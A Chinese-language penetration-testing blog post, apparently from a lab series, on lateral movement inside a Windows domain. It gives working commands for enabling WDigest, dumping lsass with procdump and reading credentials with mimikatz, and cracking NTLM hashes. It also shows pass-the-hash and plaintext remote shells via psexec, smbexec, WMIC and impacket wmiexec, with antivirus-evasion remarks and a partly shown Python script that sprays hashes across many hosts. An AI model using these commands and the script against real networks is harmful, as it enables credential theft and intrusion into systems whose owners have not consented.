{"title":"内网安全-域横向渗透【二】","uid":"3025b9eec92496f30bb6ae7638116cb8","slug":"内网安全-域横向渗透【二】","date":"2022-06-28T01:58:56.000Z","updated":"2022-06-28T08:53:25.956Z","comments":true,"path":"api/articles/内网安全-域横向渗透【二】.json","keywords":null,"cover":[],"content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"\\assets\\css\\APlayer.min.css\"><script src=\"\\assets\\js\\APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"\\assets\\js\\Meting.min.js\"></script><h2 id=\"0x00-相关知识点\"><a href=\"#0x00-相关知识点\" class=\"headerlink\" title=\"0x00 相关知识点\"></a>0x00 相关知识点</h2><h3 id=\"0x00\"><a href=\"#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>1、Windows2012以上版本默认关闭<code>wdigest</code>，攻击者无法从内存中获取明文密码（mimikatz），只能获取相关的hash值；</p>\n<p>2、Windows2012以下版本如安装KB2871997补丁，同样也会导致无法获取明文密码</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>解决方法：</p>\n<p>1、利用哈希hash传递（pth，ptk等）进行移动；</p>\n<p>2、利用其它服务协议（SMB，WMI等）进行哈希移动；</p>\n<p>3、利用注册表操作开启Wdigest，Auth值进行获取；（提权）</p>\n<p>4、利用工具或第三方平台（Hashcat）进行破解获取。</p></blockquote>\n<h3 id=\"0x01\"><a href=\"#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>Windows系统LM Hash及NTLM Hash加密算法，个人系统在Windows vista后，服务器系统在Windows 2003以后，认证方式均为NTLM Hash。</p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>开启Wdigest：</p>\n<p><code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f</code></p></blockquote>\n<h2 id=\"0x01-Procdump-Mimikatz-配合获取密码\"><a href=\"#0x01-Procdump-Mimikatz-配合获取密码\" class=\"headerlink\" title=\"0x01 Procdump+Mimikatz 配合获取密码\"></a>0x01 Procdump+Mimikatz 配合获取密码</h2><h3 id=\"0x00-1\"><a href=\"#0x00-1\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>Mimilatz上传到目标服务器可能会被杀掉或者被拦截，配合Procdump进行密码获取，Procdump使微软自带工具，不会被检测。</p>\n<h3 id=\"0x01-1\"><a href=\"#0x01-1\" class=\"headerlink\" title=\"0x01\"></a>0x01</h3><p>procdump执行以下命令生成一个存储hash值的dmp文件：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">procdump -accepteula -ma lsass.exe lsass.dmp<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628104447679.png\" alt=\"image-20220628104447679\"></p>\n<p>本地mimikatz 上执行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">privilege::debug  #进行提权<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>执行以下命令，使mimikatz载入lsass.dmp文件中的hash值进行获取密码。</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">sekurlsa::minidump lsass.dmp\n\nsekurlsa::logonPasswords full<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628105109591.png\" alt=\"image-20220628105109591\"></p>\n<p>获取到webserver密码：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628105242893.png\" alt=\"image-20220628105242893\"></p>\n<h3 id=\"0x02-总结\"><a href=\"#0x02-总结\" class=\"headerlink\" title=\"0x02 总结\"></a>0x02 总结</h3><p>一般是将procdump.exe上传至目标服务器生成一个dmp文件，再将dmp文件复制到本地使用mimikatz进行获取密码；因为mimikatz上传至服务器可能会被拦截或者杀毒软件杀掉，所以在本地进行mimikatz进行密码获取。</p>\n<h2 id=\"0x02-Hashcat破解获取-Windows-NTML-Hash\"><a href=\"#0x02-Hashcat破解获取-Windows-NTML-Hash\" class=\"headerlink\" title=\"0x02 Hashcat破解获取 Windows-NTML-Hash\"></a>0x02 Hashcat破解获取 Windows-NTML-Hash</h2><p>HashCat使用参考文章：</p>\n<p><a href=\"https://www.freebuf.com/sectool/164507.html\">https://www.freebuf.com/sectool/164507.html</a></p>\n<p><a href=\"https://blog.csdn.net/SHIGUANGTUJING/article/details/90074614\">https://blog.csdn.net/SHIGUANGTUJING/article/details/90074614</a></p>\n<p>字典下载：<br><a href=\"https://wiki.skullsecurity.org/Passwords\">https://wiki.skullsecurity.org/Passwords</a></p>\n<h2 id=\"0x03-SMB-服务利用-psexec-smbexec-官方自带\"><a href=\"#0x03-SMB-服务利用-psexec-smbexec-官方自带\" class=\"headerlink\" title=\"0x03 SMB 服务利用-psexec,smbexec(官方自带)\"></a>0x03 SMB 服务利用-psexec,smbexec(官方自带)</h2><h3 id=\"0x00-2\"><a href=\"#0x00-2\" class=\"headerlink\" title=\"0x00\"></a>0x00</h3><p>利用 SMB 服务可以通过明文或 hash 传递来远程执行，条件 445 服务端口开放。</p>\n<p>pstools下载地址：<br><a href=\"https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools\">https://docs.microsoft.com/zh-cn/sysinternals/downloads/pstools</a></p>\n<h3 id=\"0x01-psexec-第一种方法\"><a href=\"#0x01-psexec-第一种方法\" class=\"headerlink\" title=\"0x01 psexec 第一种方法\"></a>0x01 psexec 第一种方法</h3><p><strong>（先将PSTools上传至目标服务器）</strong></p>\n<p><strong>先有 ipc 链接，psexec 需要明文或 hash 传递</strong></p>\n<p>ipc连接：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">net use \\\\192.168.3.32\\ipc$ &quot;Hacker123&quot; &#x2F;user:administrator<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628111932509.png\" alt=\"image-20220628111932509\"></p>\n<p>先有 ipc 连接之后，参数 -s 以 system 权限运行</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">psexec \\\\192.168.3.32 -s cmd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628112158307.png\" alt=\"image-20220628112158307\"></p>\n<p>获取到的使system权限；</p>\n<p>查看ip，拿到目标Iip的shell：</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628112240633.png\" alt=\"image-20220628112240633\"></p>\n<h3 id=\"0x02-psexec第二种方法\"><a href=\"#0x02-psexec第二种方法\" class=\"headerlink\" title=\"0x02 psexec第二种方法\"></a>0x02 psexec第二种方法</h3><p><strong>不用建立 IPC 直接提供明文账户密码</strong></p>\n<p>执行以下命令：（不需要建立IPC连接）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">psexec \\\\192.168.3.21 -u administrator -p Hacker123 -s cmd<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628113114749.png\" alt=\"image-20220628113114749\"></p>\n<p><strong>这种方式是建立在明文密码情况下，没有明文密码就需要利用Hash值。</strong></p>\n<p>###0x03 impacket 工具包使用hash传递：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">psexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32 #官方 Pstools 无法采用 hash连接<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628115558922.png\" alt=\"image-20220628115558922\"></p>\n<p>使用 impacket 工具包：（非官方，容易被杀，需要做免杀）</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">psexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628115813191.png\" alt=\"image-20220628115813191\"></p>\n<p>查看ip：<br><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628115838950.png\" alt=\"image-20220628115838950\"></p>\n<h3 id=\"0x04-smbexec明文传递\"><a href=\"#0x04-smbexec明文传递\" class=\"headerlink\" title=\"0x04 smbexec明文传递\"></a>0x04 smbexec明文传递</h3><p><strong>无需建立ipc连接</strong></p>\n<p>1、连接域用户：</p>\n<p>执行命令：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">smbexec test&#x2F;administrator:Hacker123@192.168.3.21 <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628153143073.png\" alt=\"image-20220628153143073\"></p>\n<p>拿到目标地址shell返回system权限。</p>\n<p>2、连接本地用户：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">smbexec .&#x2F;administrator:Hacker123@192.168.3.32<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628153542606.png\" alt=\"image-20220628153542606\"></p>\n<blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>注意：</p>\n<p>smbexec test&#x2F;administrator:<a href=\"mailto:&#72;&#97;&#x63;&#x6b;&#101;&#x72;&#x31;&#50;&#x33;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#51;&#46;&#50;&#49;\">&#72;&#97;&#x63;&#x6b;&#101;&#x72;&#x31;&#50;&#x33;&#x40;&#x31;&#57;&#x32;&#x2e;&#49;&#x36;&#x38;&#x2e;&#51;&#46;&#50;&#49;</a> #这条命令是连接的test域内administrator用户；域内若是没有所连接的用户就会连接失败。</p>\n<p>smbexec .&#x2F;administrator:<a href=\"mailto:&#72;&#x61;&#99;&#107;&#101;&#114;&#49;&#x32;&#51;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x33;&#x2e;&#x33;&#50;\">&#72;&#x61;&#99;&#107;&#101;&#114;&#49;&#x32;&#51;&#x40;&#49;&#x39;&#x32;&#x2e;&#49;&#54;&#x38;&#46;&#x33;&#x2e;&#x33;&#50;</a> #这条命令连接是连接3.32主机本地administrator用户；</p>\n<p>用户名前面若是<code>domain/</code>则是域内用户；用户名前面若是<code>./</code>则是本地用户。</p></blockquote>\n<h3 id=\"0x05-smbexec哈希-hash-传递\"><a href=\"#0x05-smbexec哈希-hash-传递\" class=\"headerlink\" title=\"0x05 smbexec哈希(hash)传递\"></a>0x05 smbexec哈希(hash)传递</h3><p>通过hash值连接：</p>\n<p>执行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">smbexec -hashes :9075168608b7aba2428c8387bfeb9aee test&#x2F;administrator@192.168.3.21<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628155613411.png\" alt=\"image-20220628155613411\"></p>\n<p>执行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">smbexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628155735220.png\" alt=\"image-20220628155735220\"></p>\n<h2 id=\"0x04-WMI-服务利用-cscript-wmiexec-wmic\"><a href=\"#0x04-WMI-服务利用-cscript-wmiexec-wmic\" class=\"headerlink\" title=\"0x04  WMI 服务利用-cscript-wmiexec-wmic\"></a>0x04  WMI 服务利用-cscript-wmiexec-wmic</h2><h3 id=\"0x00-介绍\"><a href=\"#0x00-介绍\" class=\"headerlink\" title=\"0x00 介绍\"></a>0x00 介绍</h3><p><strong>WMI(Windows Management Instrumentation)</strong> 是通过 135 端口进行利用，支持用户名明文或者 hash的方式进行认证，并且该方法不会在目标日志系统留下痕迹。</p>\n<h3 id=\"0x01-自带-WMIC-明文传递-无回显\"><a href=\"#0x01-自带-WMIC-明文传递-无回显\" class=\"headerlink\" title=\"0x01 自带 WMIC 明文传递 无回显\"></a>0x01 自带 WMIC 明文传递 无回显</h3><p><strong>优点：官方自带WMIC</strong></p>\n<p><strong>缺点：无回显</strong></p>\n<p>执行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wmic &#x2F;node:192.168.3.21 &#x2F;user:administrator &#x2F;password:Hacker123 process call create &quot;cmd.exe &#x2F;c ipconfig &gt;C:\\1.txt&quot;\n（连接3.21主机并执行ipconfig写如3.21主机c盘的1.txt）<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628160500786.png\" alt=\"image-20220628160500786\"></p>\n<p>查看DC主机c盘生成了1.txt文件</p>\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628160437122.png\" alt=\"image-20220628160437122\"></p>\n<h3 id=\"0x02-自带-cscript-明文传递-有回显\"><a href=\"#0x02-自带-cscript-明文传递-有回显\" class=\"headerlink\" title=\"0x02 自带 cscript 明文传递 有回显\"></a>0x02 自带 cscript 明文传递 有回显</h3><p><strong>优点：官方自带cscript，不会被检测，有回显</strong></p>\n<p><strong>缺点：需要下载<code>wmiexec.vbs</code>脚本配合运行</strong></p>\n<p>wmiexec.vbs下载地址：</p>\n<p><a href=\"https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs\">https://gitee.com/mirrors/K8tools/blob/master/wmiexec.vbs</a></p>\n<p>执行：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.3.21 administrator Hacker123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628161824598.png\" alt=\"image-20220628161824598\"></p>\n<h3 id=\"0x03-impacket-wmiexec-明文或-hash-传递-有回显\"><a href=\"#0x03-impacket-wmiexec-明文或-hash-传递-有回显\" class=\"headerlink\" title=\"0x03 impacket wmiexec 明文或 hash 传递 有回显\"></a>0x03 impacket wmiexec 明文或 hash 传递 有回显</h3><p><strong>优点：有回显</strong></p>\n<p><strong>缺点：借助impacket包，需要做免杀</strong></p>\n<p><strong>1、明文传递：</strong></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wmiexec .&#x2F;administrator:Hacker123@192.168.3.32 &quot;whoami&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628162355107.png\" alt=\"image-20220628162355107\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wmiexec test&#x2F;administrator:Hacker123@192.168.3.21 &quot;whoami&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628162447135.png\" alt=\"image-20220628162447135\"></p>\n<p><strong>2、hash传递：</strong></p>\n<p>密文连接：</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wmiexec -hashes :9075168608b7aba2428c8387bfeb9aee .&#x2F;administrator@192.168.3.32 &quot;whoami&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628162730954.png\" alt=\"image-20220628162730954\"></p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">wmiexec -hashes :9075168608b7aba2428c8387bfeb9aee test&#x2F;administrator@192.168.3.21 &quot;whoami&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p><img src=\"/post/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E6%B8%97%E9%80%8F%E3%80%90%E4%BA%8C%E3%80%91.htm/image-20220628162754565.png\" alt=\"image-20220628162754565\"></p>\n<h2 id=\"0x05-以上服务-hash-批量利用\"><a href=\"#0x05-以上服务-hash-批量利用\" class=\"headerlink\" title=\"0x05 以上服务 hash 批量利用\"></a>0x05 以上服务 hash 批量利用</h2><p>批量脚本：</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> os<span class=\"token punctuation\">,</span>time\nips<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token string\">'192.168.3.21'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'192.168.3.25'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'192.168.3.29'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'192.168.3.30'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'192.168.3.32'</span>\n<span class=\"token punctuation\">&#125;</span>\nusers<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token string\">'Administrator'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'boss'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'dbadmin'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'fileadmin'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'mack'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'mary'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'webadmin'</span>\n<span class=\"token punctuation\">&#125;</span>\nhashs<span class=\"token operator\">=</span><span class=\"token punctuation\">&#123;</span>\n<span class=\"token string\">'9075168608b7aba2428c8387bfeb9aee'</span><span class=\"token punctuation\">,</span>\n<span class=\"token string\">'9075168608b7aba2428c8387bfeb9aee'</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">for</span> ip <span class=\"token keyword\">in</span> ips<span class=\"token punctuation\">:</span>\n<span class=\"token keyword\">for</span> user <span class=\"token keyword\">in</span> users<span class=\"token punctuation\">:</span>\n<span class=\"token keyword\">for</span> mimahash <span class=\"token keyword\">in</span> hashs<span class=\"token punctuation\">:</span>\n<span class=\"token comment\">#wmiexec -hashes :hashgod/user@ipwhoami</span>\n<span class=\"token keyword\">exec</span> <span class=\"token operator\">=</span> <span class=\"token string\">\"wmiexec -hashes :\"</span><span class=\"token operator\">+</span>mimahash<span class=\"token operator\">+</span><span class=\"token string\">\" god/\"</span><span class=\"token operator\">+</span>user<span class=\"token operator\">+</span><span class=\"token string\">\"@\"</span><span class=\"token operator\">+</span>ip<span class=\"token operator\">+</span><span class=\"token string\">\" whoami\"</span>\nexec1 <span class=\"token operator\">=</span> <span class=\"token string\">\"wmiexec -hashes :\"</span><span class=\"token operator\">+</span>mimahash<span class=\"token operator\">+</span><span class=\"token string\">\" ./\"</span><span class=\"token operator\">+</span>user<span class=\"token operator\">+</span><span class=\"token string\">\"@\"</span><span class=\"token operator\">+</span>ip<span class=\"token operator\">+</span><span class=\"token string\">\" whoami\"</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--->'</span> <span class=\"token operator\">+</span> <span class=\"token keyword\">exec</span> <span class=\"token operator\">+</span> <span class=\"token string\">'&lt;---'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'--->'</span> <span class=\"token operator\">+</span> exec1 <span class=\"token operator\">+</span> <span class=\"token 